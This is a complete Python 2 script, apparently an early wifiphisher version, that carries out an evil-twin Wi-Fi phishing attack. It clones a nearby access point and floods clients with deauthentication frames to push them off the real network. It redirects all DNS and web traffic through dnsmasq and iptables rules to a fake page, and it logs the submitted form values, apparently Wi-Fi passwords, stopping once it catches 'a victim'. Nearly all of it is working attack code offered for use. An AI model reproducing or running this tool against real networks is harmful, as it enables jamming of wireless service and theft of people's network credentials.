#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import ssl
import re
import time
import sys
import SimpleHTTPServer
import BaseHTTPServer
import httplib
import SocketServer
import cgi
import argparse
import fcntl
from threading import Thread, Lock
from subprocess import Popen, PIPE, check_output
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

conf.verb = 0

# Basic configuration
PORT = 8080
SSL_PORT = 443
PEM = 'cert/server.pem'
PHISING_PAGE = "access-point-pages/minimal"
POST_VALUE_PREFIX = "wfphshr"
DN = open(os.devnull, 'w')

# Console colors
W = '\033[0m'    # white (normal)
R = '\033[31m'   # red
G = '\033[32m'   # green
O = '\033[33m'   # orange
B = '\033[34m'   # blue
P = '\033[35m'   # purple
C = '\033[36m'   # cyan
GR = '\033[37m'  # gray
T = '\033[93m'   # tan

count = 0  # for channel hopping Thread
APs = {}  # for listing APs
hop_daemon_running = True
lock = Lock()


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--channel",
        help="Choose the channel for monitoring. Default is channel 1",
        default="1"
    )
    parser.add_argument(
        "-s",
        "--skip",
        help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA"
    )
    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Choose monitor mode interface. " +
              "By default script will find the most powerful interface and " +
              "starts monitor mode on it. Example: -jI mon5"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Choose monitor mode interface. " +
              "By default script will find the most powerful interface and " +
              "starts monitor mode on it. Example: -jI mon5"
              )
    )
    parser.add_argument(
        "-m",
        "--maximum",
        help=("Choose the maximum number of clients to deauth." +
              "List of clients will be emptied and repopulated after" +
              "hitting the limit. Example: -m 5"
              )
    )
    parser.add_argument(
        "-n",
        "--noupdate",
        help=("Do not clear the deauth list when the maximum (-m) number" +
              "of client/AP combos is reached. Must be used in conjunction" +
              "with -m. Example: -m 10 -n"
              ),
        action='store_true'
    )
    parser.add_argument(
        "-t",
        "--timeinterval",
        help=("Choose the time interval between packets being sent." +
              " Default is as fast as possible. If you see scapy " +
              "errors like 'no buffer space' try: -t .00001"
              )
    )
    parser.add_argument(
        "-p",
        "--packets",
        help=("Choose the number of packets to send in each deauth burst. " +
              "Default value is 1; 1 packet to the client and 1 packet to " +
              "the AP. Send 2 deauth packets to the client and 2 deauth " +
              "packets to the AP: -p 2"
              )
    )
    parser.add_argument(
        "-d",
        "--directedonly",
        help=("Skip the deauthentication packets to the broadcast address of" +
              "the access points and only send them to client/AP pairs"
              ),
        action='store_true')
    parser.add_argument(
        "-a",
        "--accesspoint",
        help="Enter the MAC address of a specific access point to target"
    )

    return parser.parse_args()


class SecureHTTPServer(BaseHTTPServer.HTTPServer):
    """
    Simple HTTP server that extends the SimpleHTTPServer standard
    module to support the SSL protocol.

    Only the server is authenticated while the client remains
    unauthenticated (i.e. the server will not request a client
    certificate).

    It also reacts to self.stop flag.
    """
    def __init__(self, server_address, HandlerClass):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        self.socket = ssl.SSLSocket(
            socket.socket(self.address_family, self.socket_type),
            keyfile=PEM,
            certfile=PEM
        )

        self.server_bind()
        self.server_activate()

    def serve_forever(self):
        """
        Handles one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTPS server. It responds to
    everything with a 301 redirection to the HTTP server.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://10.0.0.1:' + str(PORT))
        self.end_headers()

    def log_message(self, format, *args):
        return


class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self):
        """
        Handle one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTP server that logs POST requests.
    """
    def redirect(self, page="/"):
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):

        if self.path == "/":
            wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
            with open(wifi_webserver_tmp, "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                               self.client_address[0] + W + "\n"
                               )
                log_file.close()
            self.path = "index.html"
        self.path = "%s/%s" % (PHISING_PAGE, self.path)

        if self.path.endswith(".html"):
            if not os.path.isfile(self.path):
                self.send_response(404)
                return
            f = open(self.path)
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            # Send file content to client
            self.wfile.write(f.read())
            f.close()
            return
        # Leave binary and other data to default handler.
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            if item.name and item.value and POST_VALUE_PREFIX in item.name:
                self.redirect("/upgrading.html")
                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                with open(wifi_webserver_tmp, "a+") as log_file:
                    log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                   T + self.client_address[0] +
                                   R + " " + item.name + "=" + item.value +
                                   W + "\n"
                                   )
                    log_file.close()
                return       
        self.redirect()

    def log_message(self, format, *args):
        return


def stop_server(port=PORT, ssl_port=SSL_PORT):
    """
    Sends QUIT request to HTTP server running on localhost:<port>
    """
    conn = httplib.HTTPConnection("localhost:%d" % port)
    conn.request("QUIT", "/")
    conn.getresponse()

    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
    conn.request("QUIT", "/")
    conn.getresponse()


def shutdown():
    """
    Shutdowns program.
    """
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    reset_interfaces()
    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)


def get_interfaces():
    interfaces = {"monitor": [], "managed": [], "all": []}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0:
            continue  # Isn't an empty string
        if line[0] != ' ':  # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface
                if 'Mode:Monitor' in line:
                    interfaces["monitor"].append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces["managed"].append(iface)
                interfaces["all"].append(iface)
    return interfaces


def get_iface(mode="all", exceptions=["_wifi"]):
    ifaces = get_interfaces()[mode]
    for i in ifaces:
        if i not in exceptions:
            return i
    return False


def reset_interfaces():
    monitors = get_interfaces()["monitor"]
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)


def get_internet_interface():
    '''return the wifi internet connected iface'''
    inet_iface = None

    if os.path.isfile("/sbin/ip") == True:
        proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
        def_route = proc.communicate()[0].split('\n')  # [0].split()
        for line in def_route:
            if 'wlan' in line and 'default via' in line:
                line = line.split()
                inet_iface = line[4]
                ipprefix = line[2][:2]  # Just checking if it's 192, 172, or 10
                return inet_iface
    else:
        proc = open('/proc/net/route', 'r')
        default = proc.readlines()[1]
        if "wlan" in default:
            def_route = default.split()[0]
        x = iter(default.split()[2])
        res = [''.join(i) for i in zip(x, x)]
        d = [str(int(i, 16)) for i in res]
        return inet_iface
    return False


def get_internet_ip_prefix():
    '''return the wifi internet connected IP prefix'''
    ipprefix = None
    if os.path.isfile("/sbin/ip") == True:
        proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
        def_route = proc.communicate()[0].split('\n')  # [0].split()
        for line in def_route:
            if 'wlan' in line and 'default via' in line:
                line = line.split()
                inet_iface = line[4]
                ipprefix = line[2][:2]  # Just checking if it's 192, 172, or 10
                return ipprefix
    else:
        proc = open('/proc/net/route', 'r')
        default = proc.readlines()[1]
        if "wlan" in default:
            def_route = default.split()[0]
        x = iter(default.split()[2])
        res = [''.join(i) for i in zip(x, x)]
        d = [str(int(i, 16)) for i in res]
        return ipprefix
    return False


def channel_hop(mon_iface):
    chan = 0
    err = None
    while hop_daemon_running:
        try:
            err = None
            if chan > 11:
                chan = 0
            chan = chan + 1
            channel = str(chan)
            iw = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', channel],
                stdout=DN, stderr=PIPE
            )
            for line in iw.communicate()[1].split('\n'):
                # iw dev shouldnt display output unless there's an error
                if len(line) > 2:
                    with lock:
                        err = (
                            '[' + R + '-' + W + '] Channel hopping failed: ' +
                            R + line + W + '\n'
                            'Try disconnecting the monitor mode\'s parent' +
                            'interface (e.g. wlan0)\n'
                            'from the network if you have not already\n'
                        )
                    break
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()


def sniffing(interface, cb):
    '''This exists for if/when I get deauth working
    so that it's easy to call sniff() in a thread'''
    sniff(iface=interface, prn=cb, store=0)


def targeting_cb(pkt):
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ap_channel = str(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()


def target_APs():
    global APs, count
    os.system('clear')
    print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' +
           ' point from below')
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' +
               T + APs[ap][1] + W)


def copy_AP():
    global APs, count
    copy = None
    while not copy:
        try:
            copy = raw_input(
                ('\n[' + G + '+' + W + '] Choose the [' + G + 'num' + W +
                 '] of the AP you wish to copy: ')
            )
            copy = int(copy)
        except Exception:
            copy = None
            continue
    try:
        channel = APs[copy][0]
        essid = APs[copy][1]
        if str(essid) == "\x00":
            essid = ' '
        mac = APs[copy][2]
        return channel, essid, mac
    except KeyError:
        return copy_AP()


def start_ap(mon_iface, channel, essid, args):
    print '[' + T + '*' + W + '] Starting the fake access point...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (mon_iface, essid, channel))

    Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        cleanup(None, None)


def dhcp_conf(interface):

    config = (
        # disables dnsmasq reading any other files like
        # /etc/resolv.conf for nameservers
        'no-resolv\n'
        # Interface to bind to
        'interface=%s\n'
        # Specify starting_range,end_range,lease_time
        'dhcp-range=%s\n'
        'address=/#/10.0.0.1'
    )

    ipprefix = get_internet_ip_prefix()
    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            # subnet, range, router, dns
            dhcpconf.write(config % (interface, '10.0.0.2,10.0.0.100,12h'))
    elif ipprefix == '10':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (interface, '172.16.0.2,172.16.0.100,12h'))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    os.system('echo > /var/lib/misc/dnsmasq.leases')
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    ipprefix = get_internet_ip_prefix()
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
        Popen(
            ['ifconfig', str(mon_iface), 'up', '10.0.0.1',
             'netmask', '255.255.255.0'
             ],
            stdout=DN,
            stderr=DN
        )
        time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
        os.system(
            ('route add -net 10.0.0.0 netmask ' +
             '255.255.255.0 gw 10.0.0.1')
        )
    else:
        Popen(
            ['ifconfig', str(mon_iface), 'up', '172.16.0.1',
             'netmask', '255.255.255.0'
             ],
            stdout=DN,
            stderr=DN
        )
        time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
        os.system(
            ('route add -net 172.16.0.0 netmask ' +
             '255.255.255.0 gw 172.16.0.1')
        )


def get_strongest_iface(exceptions=[]):
    interfaces = get_interfaces()["managed"]
    scanned_aps = []
    for i in interfaces:
        if i in exceptions:
            continue
        count = 0
        proc = Popen(['iwlist', i, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line:  # first line in iwlist scan for a new AP
                count += 1
        scanned_aps.append((count, i))
        print ('[' + G + '+' + W + '] Networks discovered by '
               + G + i + W + ': ' + T + str(count) + W)
    if len(scanned_aps) > 0:
        interface = max(scanned_aps)[1]
        return interface
    return False


def start_mode(interface, mode="monitor"):
    print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off '
           + G + interface + W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode %s' % (interface, mode))
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('[' + R + '-' + W + '] Could not start %s mode' % mode)


# Wifi Jammer stuff
def channel_hop2(mon_iface):
    '''
    First time it runs through the channels it stays on each channel for
    5 seconds in order to populate the deauth list nicely.
    After that it goes as fast as it can
    '''
    global monchannel, first_pass

    channelNum = 0
    err = None

    while 1:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            if channelNum > 11:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            proc = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
                stdout=DN,
                stderr=PIPE
            )

            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2:
                    # iw dev shouldnt display output unless there's an error
                    err = ('[' + R + '-' + W + '] Channel hopping failed: '
                           + R + line + W)

        output(monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(monchannel)


def deauth(monchannel):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
    if there's multi-APs to one gateway. Constantly scans the clients_APs list
    and starts a thread to deauth each instance
    '''

    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                '''
                Can't add a RadioTap() layer as the first layer or it's a
                malformed Association request packet?
                Append the packets to a new list so we don't have to hog the
                lock type=0, subtype=12?
                '''
                if ch == monchannel:
                    deauth_pkt1 = Dot11(
                        addr1=client,
                        addr2=ap,
                        addr3=ap) / Dot11Deauth()
                    deauth_pkt2 = Dot11(
                        addr1=ap,
                        addr2=client,
                        addr3=client) / Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(
                            addr1='ff:ff:ff:ff:ff:ff',
                            addr2=ap,
                            addr3=ap) / Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1

        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))


def output(monchannel):
    wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
    with open(wifi_jammer_tmp, "a+") as log_file:
        log_file.truncate()
        with lock:
            for ca in clients_APs:
                if len(ca) > 3:
                    log_file.write(
                        ('[' + T + '*' + W + '] ' + O + ca[0] + W +
                         ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) +
                         ' - ' + T + ca[3] + W + '\n')
                    )
                else:
                    log_file.write(
                        '[' + T + '*' + W + '] ' + O + ca[0] + W +
                        ' - ' + O + ca[1] + W + ' - ' + ca[2]
                    )
        with lock:
            for ap in APs:
                log_file.write(
                    '[' + T + '*' + W + '] ' + O + ap[0] + W +
                    ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n'
                )
        # print ''


def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast,
    # broadcast
    ignore = [
        'ff:ff:ff:ff:ff:ff',
        '00:00:00:00:00:00',
        '33:33:00:', '33:33:ff:',
        '01:80:c2:00:00:00',
        '01:00:5e:',
        mon_MAC
    ]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True


def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    global clients_APs, APs

    # return these if's keeping clients_APs the same or just reset clients_APs?
    # I like the idea of the tool repopulating the variable more
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    '''
    We're adding the AP and channel to the deauth list at time of creation
    rather than updating on the fly in order to avoid costly for loops
    that require a lock.
    '''

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:

            # Filter out all other APs and clients if asked
            if args.accesspoint:
                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                    return

            # Check if it's added to our AP list
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel)

            # Ignore all the noisy packets like spanning tree
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)


def APs_add(clients_APs, APs, pkt, chan_arg):
    ssid = pkt[Dot11Elt].info
    bssid = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        # Prevent 5GHz APs from being thrown into the mix
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])


def clients_APs_add(clients_APs, addr1, addr2):

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])


def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])


def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    sniff(iface=mon_iface, store=0, prn=cb)


def get_hostapd():
    if not os.path.isfile('/usr/sbin/hostapd'):
        install = raw_input(
            ('[' + T + '*' + W + '] isc-dhcp-server not found ' +
             'in /usr/sbin/hostapd, install now? [y/n] ')
        )
        if install == 'y':
            os.system('apt-get -y install hostapd')
        else:
            sys.exit(('[' + R + '-' + W + '] hostapd' +
                     'not found in /usr/sbin/hostapd'))
    if not os.path.isfile('/usr/sbin/hostapd'):
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to install the \'hostapd\' package!\n' +
            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
            '[' + G + '+' + W + '] Rerun the script again to install hostapd.\n' +
            '[' + R + '!' + W + '] Closing'
         ))

if __name__ == "__main__":

    # Parse args
    args = parse_args()
    # Are you root?
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')
    # Get hostapd if needed
    get_hostapd()

    # Start HTTP server in a background thread
    Handler = HTTPRequestHandler
    httpd = HTTPServer(("", PORT), Handler)
    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
    webserver = Thread(target=httpd.serve_forever)
    webserver.daemon = True
    webserver.start()

    # Start HTTPS server in a background thread
    Handler = SecureHTTPRequestHandler
    httpd = SecureHTTPServer(("", SSL_PORT), Handler)
    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
           str(SSL_PORT))
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    # Get interfaces
    reset_interfaces()
    inet_iface = get_internet_interface()
    if not args.jamminginterface:
        mon_iface = get_iface(mode="monitor", exceptions=[inet_iface])
        iface_to_monitor = False
    else:
        mon_iface = False
        iface_to_monitor = args.jamminginterface
    if not mon_iface:
        if args.jamminginterface:
            iface_to_monitor = args.jamminginterface
        else:
            iface_to_monitor = get_strongest_iface()
        if not iface_to_monitor and not inet_iface:
            sys.exit(
                ('[' + R + '-' + W +
                 '] No wireless interfaces found, bring one up and try again'
                 )
            )
        mon_iface = start_mode(iface_to_monitor, "monitor")
    wj_iface = mon_iface
    if not args.apinterface:
        ap_iface = get_iface(mode="managed", exceptions=[iface_to_monitor])
    else:
        ap_iface = args.apinterface

    if inet_iface and inet_iface in [ap_iface, iface_to_monitor]:
        sys.exit(
            ('[' + G + '+' + W + 
            '] Interface %s is connected to the Internet. ' % inet_iface +
            'Please disconnect and rerun the script.\n' +
            '[' + R + '!' + W + '] Closing'
            )
        )


    '''
    We got the interfaces correctly at this point. Monitor mon_iface & for
    the AP ap_iface.
    '''
    # Set iptable rules and kernel variables.
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT ' +
         '--to-destination 10.0.0.1:%s' % PORT)
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT ' +
         '--to-destination 10.0.0.1:%s' % SSL_PORT)
    )
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'

    # Copy AP
    time.sleep(3)
    hop = Thread(target=channel_hop, args=(mon_iface,))
    hop.daemon = True
    hop.start()
    sniffing(mon_iface, targeting_cb)
    channel, essid, ap_mac = copy_AP()
    hop_daemon_running = False

    # Start AP
    start_ap(ap_iface, channel, essid, args)
    dhcpconf = dhcp_conf(ap_iface)
    dhcp(dhcpconf, ap_iface) 
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + mon_iface +
           W + ' on ' + T + str(ap_iface) + W)

    clients_APs = []
    APs = []
    args = parse_args()
    args.accesspoint = ap_mac
    args.channel = channel
    monitor_on = None
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    monchannel = channel
    # Start channel hopping
    hop = Thread(target=channel_hop2, args=(wj_iface,))
    hop.daemon = True
    hop.start()

    # Start sniffing
    sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Main loop.
    try:
        while 1:
            os.system("clear")
            print "Jamming devices: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "DHCP Leases: "
            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "HTTP requests: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(
                    ['tail', '-5', '/tmp/wifiphisher-webserver.tmp']
                )
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
                # We got a victim. Shutdown everything.
                if POST_VALUE_PREFIX in l:
                    time.sleep(2)
                    shutdown()
            time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown()
